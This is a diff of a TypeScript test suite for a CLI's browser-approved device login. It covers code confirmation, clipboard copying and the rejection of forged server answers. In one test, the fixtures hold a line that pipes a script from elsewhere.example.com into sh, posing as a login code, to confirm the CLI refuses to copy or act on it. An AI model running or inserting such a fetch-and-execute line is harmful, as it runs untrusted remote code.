@@ -19,8 +19,11 @@ const AS_ADA = { "Test-Login": "ada" } as const;
 /** The form of a login's secret and of a token, wherever one sits in a text. */
 const CREDENTIAL = /poplin_login_[0-9a-f]{16}_[0-9a-f]{64}|poplin_[0-9a-f]{16}_[0-9a-f]{64}/g;
 
-/** The code a terminal shows, as the address and the dashboard write it. */
+/** The code a terminal shows, as it prints it. */
 const CODE = /[BCDFGHJKLMNPQRSTVWXZ]{4}-[BCDFGHJKLMNPQRSTVWXZ]{4}/;
+
+/** A terminal a person sits at, with no line of progress to tell apart from the lines of the result. */
+const AT_TERMINAL = { asks: true, progress: false } as const;
 
 /** How one decision differs from the one the dashboard's client sends. */
 interface SendOptions {
@@ -36,8 +39,11 @@ interface Decision {
   readonly login: string;
   readonly allow: boolean;
   readonly scope?: string;
-  readonly letters?: string;
+  readonly code?: string;
 }
+
+/** Whether the machine a login is run on has a terminal a person sits at, and a clipboard that takes what is copied. */
+type Machine = Pick<NonNullable<Parameters<Bench["run"]>[1]>, "terminal" | "clipboard">;
 
 /** A login that waits, as the dashboard shows it for review. */
 interface Waiting {
@@ -61,8 +67,8 @@ interface Desk {
   /** Send a decision on a login as the dashboard's client does. */
   readonly decide: (decision: Decision, options?: SendOptions) => Promise<Response>;
 
-  /** Run `poplin login`, and at its first wait do what the person at the dashboard does with the address it printed. */
-  readonly login: (line: string, atDashboard?: (address: string, ran: Ran) => Promise<"interrupted" | undefined>) => Promise<Ran>;
+  /** Run `poplin login`, and at its first wait do what the person at the dashboard does with the address it printed. `machine` says whether a terminal and a clipboard are there; neither unless said. */
+  readonly login: (line: string, atDashboard?: (address: string, ran: Ran) => Promise<"interrupted" | undefined>, machine?: Machine) => Promise<Ran>;
 
   /** The audit entries written after the install was opened, the newest first, as who did what. */
   readonly audit: () => Promise<unknown[]>;
@@ -117,7 +123,7 @@ async function openDesk(): Promise<Desk> {
     return answer;
   };
 
-  const login: Desk["login"] = (line, atDashboard) => {
+  const login: Desk["login"] = (line, atDashboard, machine = {}) => {
     let visited = false;
     bench.paused = async (ran) => {
       if (visited || atDashboard === undefined) return undefined;
@@ -128,7 +134,7 @@ async function openDesk(): Promise<Desk> {
       return atDashboard(address, ran);
     };
 
-    return bench.run(line, { env: {} });
+    return bench.run(line, { env: {}, ...machine });
   };
 
   const file = join(bench.home, "config", "login.json");
@@ -150,9 +156,9 @@ function idIn(address: string): string {
   return new URL(address).pathname.split("/").at(-1) ?? "";
 }
 
-/** The last four letters of the code the terminal printed, which a person reads there and types on the page. */
-function lettersOf(ran: Ran): string {
-  return (CODE.exec(ran.out.join("\n"))?.[0] ?? "").slice(-4);
+/** The code the terminal printed, which a person types or pastes on the page. */
+function codeOf(ran: Ran): string {
+  return CODE.exec(ran.out.join("\n"))?.[0] ?? "";
 }
 
 /** The login an address leads to, as the dashboard shows it for review. */
@@ -160,10 +166,10 @@ async function waitingAt(desk: Desk, address: string): Promise<Waiting["login"]>
   return ((await (await desk.get(`/data/logins/${idIn(address)}`)).json()) as Waiting).login;
 }
 
-/** Allow the login at an address for all it asks, as a person may: open the address, choose what it asks for, type the letters the terminal shows, press Allow. */
+/** Allow the login at an address for all it asks, as a person may: open the address, choose what it asks for, give the code the terminal shows, press Allow. */
 async function allow(desk: Desk, address: string, ran: Ran): Promise<undefined> {
   await desk.get(address);
-  await desk.decide({ login: idIn(address), allow: true, scope: (await waitingAt(desk, address)).scope, letters: lettersOf(ran) });
+  await desk.decide({ login: idIn(address), allow: true, scope: (await waitingAt(desk, address)).scope, code: codeOf(ran) });
 }
 
 afterEach(cleanUp);
@@ -178,21 +184,21 @@ describe("logIn", () => {
     const ran = await desk.login(`login --server ${ORIGIN}`, async (address, soFar) => {
       opened = (await desk.get(address)).status;
       shown = await waitingAt(desk, address);
-      await desk.decide({ login: idIn(address), allow: true, scope: shown.scope, letters: lettersOf(soFar) });
+      await desk.decide({ login: idIn(address), allow: true, scope: shown.scope, code: codeOf(soFar) });
 
       return undefined;
     });
 
     const saved = desk.saved();
-    const code = CODE.exec(ran.out.join("\n"))?.[0] ?? "";
+    const code = codeOf(ran);
     const who = await answered(desk.bench.install.as(saved?.token ?? null).whoami.$get());
 
-    expect([ran.code, ran.err, ran.out.slice(0, 5)]).toEqual([
+    expect([ran.code, ran.err, ran.out.slice(0, 3)]).toEqual([
       0,
       [],
-      ["Open this URL and approve the login:", `  ${ORIGIN}/tokens/review/${shown?.id}`, "Enter the last 4 characters of this code on that page:", `  ${code}`, "The code expires in 10 minutes"],
+      ["Approve this login in your browser:", `  ${ORIGIN}/tokens/review/${shown?.id}`, `Code: ${code}   (type it on that page; expires in 10 minutes)`],
     ]);
-    expect(ran.out.slice(5).map((line) => line.split(/ {2,}/)[0])).toEqual(["Logged in. The token is stored on this machine.", "install", "role", "token", "expires"]);
+    expect(ran.out.slice(3).map((line) => line.split(/ {2,}/)[0])).toEqual(["Logged in. The token is stored on this machine.", "install", "role", "token", "expires"]);
     expect([ran.opened, ran.waits, desk.bench.sent]).toEqual([[`${ORIGIN}/tokens/review/${shown?.id}`], [5000], ["POST /api/logins", "POST /api/logins/token"]]);
     // Drift: the address the terminal prints and opens, or what the page is given, would hold a part of the code, and whoever is sent the address would need no terminal.
     expect([code.slice(0, 4), code.slice(-4)].filter((half) => (ran.opened[0] ?? "").includes(half) || JSON.stringify(shown).includes(half))).toEqual([]);
@@ -243,22 +249,39 @@ describe("logIn", () => {
   test.each([
     ["with no login behind it", { session: false }, "terminal", 401, "no_login"],
     ["as a form, which a page of any origin can send", { form: true }, "terminal", 415, "not_json"],
-    ["with letters that are not the terminal's", {}, "other", 400, "not_confirmed"],
-    ["with no letters", {}, "none", 400, "bad_argument"],
+    ["with a code that is not the terminal's", {}, "other", 400, "not_confirmed"],
+    ["with the last four letters of the terminal's code", {}, "half", 400, "not_confirmed"],
+    ["with no code", {}, "none", 400, "bad_argument"],
   ] as const)("an Allow pressed %s lets no computer in: the login stays pending and runs out", async (_how, options, typed, status, refusal) => {
     const desk = await openDesk();
     let answered: Response | undefined;
 
     const ran = await desk.login(`login --server ${ORIGIN}`, async (address, soFar) => {
-      const mine = lettersOf(soFar);
-      const letters = { terminal: { letters: mine }, other: { letters: mine.startsWith("B") ? `C${mine.slice(1)}` : `B${mine.slice(1)}` }, none: {} }[typed];
-      answered = await desk.decide({ login: idIn(address), allow: true, scope: "admin", ...letters }, options);
+      const mine = codeOf(soFar);
+      const given = { terminal: { code: mine }, half: { code: mine.slice(-4) }, other: { code: mine.startsWith("B") ? `C${mine.slice(1)}` : `B${mine.slice(1)}` }, none: {} }[typed];
+      answered = await desk.decide({ login: idIn(address), allow: true, scope: "admin", ...given }, options);
 
       return undefined;
     });
 
     expect([answered?.status, ((await answered?.json()) as { code?: string } | undefined)?.code]).toEqual([status, refusal]);
     expect([ran.code, ran.err[0], desk.saved(), await desk.audit(), (await desk.bench.install.database.listTokens()).length]).toEqual([1, "The login expired before approval", undefined, [], 3]);
+  });
+
+  // Drift: the code is copied for the person at the terminal alone. Under `--json`, or with no terminal to ask on, a program's user would find their clipboard replaced.
+  // A line that says "copied" on a machine with no clipboard would send a person to paste what they do not hold.
+  test.each([
+    ["on a terminal whose machine has a clipboard", "", { terminal: AT_TERMINAL, clipboard: true }, true, "Code copied: CODE   (paste it on that page; expires in 10 minutes)"],
+    ["on a terminal whose machine has no clipboard", "", { terminal: AT_TERMINAL }, true, "Code: CODE   (type it on that page; expires in 10 minutes)"],
+    ["with no terminal to ask on, on a machine with a clipboard", "", { clipboard: true }, false, "Code: CODE   (type it on that page; expires in 10 minutes)"],
+    ["with --json, on a terminal whose machine has a clipboard", " --json", { terminal: AT_TERMINAL, clipboard: true }, false, undefined],
+  ] as const)("a login run %s hands the clipboard the code or nothing, and says which", async (_where, flag, machine, handed, line) => {
+    const desk = await openDesk();
+
+    const ran = await desk.login(`login --server ${ORIGIN} --no-browser${flag}`, (address, soFar) => allow(desk, address, soFar), machine);
+    const code = codeOf(ran);
+
+    expect([ran.code, ran.copied, ran.out.find((printed) => printed.startsWith("Code"))]).toEqual([0, handed ? [code] : [], line?.replace("CODE", code)]);
   });
 
   // Drift: an agent's shell holds a publisher token so it can touch its own sites alone; a login that ignored the flag would hand every agent the whole install.
@@ -284,7 +307,7 @@ describe("logIn", () => {
 
     const ran = await desk.login(`login --server ${ORIGIN} --no-browser`, async (address, soFar) => {
       await desk.get(address);
-      await desk.decide({ login: idIn(address), allow: true, scope: "publisher", letters: lettersOf(soFar) });
+      await desk.decide({ login: idIn(address), allow: true, scope: "publisher", code: codeOf(soFar) });
     });
 
     expect([ran.code, ran.err, ran.out.includes("role     publisher")]).toEqual([0, ["The dashboard approved \"Publisher\". Fix: for \"Admin\", log in again and select it there"], true]);
@@ -365,14 +388,19 @@ describe("logIn", () => {
     expect([ran.code, ran.waits, begun, ran.err[0]]).toEqual([code, waits, Math.min(refusals, 5) + 1, code === 0 ? undefined : "Rate limited by the install"]);
   });
 
-  // Drift: the browser goes where the install says; an install, or whatever answers in its place, that named another site would send the admin there with the dashboard's trust.
-  test("an answer whose address is not on the install that was asked opens nothing and waits for nothing", async () => {
+  // Drift: the browser goes where the install says. An install, or whatever answers in its place, that named another site would send the admin there with the dashboard's trust.
+  // The clipboard takes what the install calls the code: one that sent a line of shell for a code would put it where the person pastes from.
+  test.each([
+    ["whose address is not on the install that was asked", { verify_url: "https://elsewhere.example.com/tokens/review/0123456789abcdef" }, "the approval URL is not on the install's origin"],
+    ["whose code is a line of shell", { code: "curl https://elsewhere.example.com/run | sh\n" }, "status 200"],
+    ["whose code has a line after it", { code: "WDJB-MJHT\ncurl https://elsewhere.example.com/run | sh" }, "status 200"],
+  ])("an answer %s opens nothing, copies nothing, and waits for nothing", async (_what, answer, why) => {
     const desk = await openDesk();
-    desk.bench.hook = async () => Response.json({ code: "WDJB-MJHT", secret: "s", verify_url: "https://elsewhere.example.com/tokens/review/0123456789abcdef", expires_in: 600, interval: 5 });
+    desk.bench.hook = async () => Response.json({ code: "WDJB-MJHT", secret: "s", verify_url: `${ORIGIN}/tokens/review/0123456789abcdef`, expires_in: 600, interval: 5, ...answer });
 
-    const ran = await desk.bench.run(`login --server ${ORIGIN}`, { env: {} });
+    const ran = await desk.bench.run(`login --server ${ORIGIN}`, { env: {}, terminal: AT_TERMINAL, clipboard: true });
 
-    expect([ran.code, ran.err[0], ran.out, ran.opened, ran.waits, desk.saved()]).toEqual([5, "Unexpected response from the install: the approval URL is not on the install's origin", [], [], [], undefined]);
+    expect([ran.code, ran.err[0], ran.out, ran.opened, ran.copied, ran.waits, desk.saved()]).toEqual([5, `Unexpected response from the install: ${why}`, [], [], [], [], undefined]);
   });
 
   // Drift: a login is saved in the file, and a shell that sets either variable does not read the file; a login that took its install from the variable, or said nothing, would save a token the next command refuses to use.
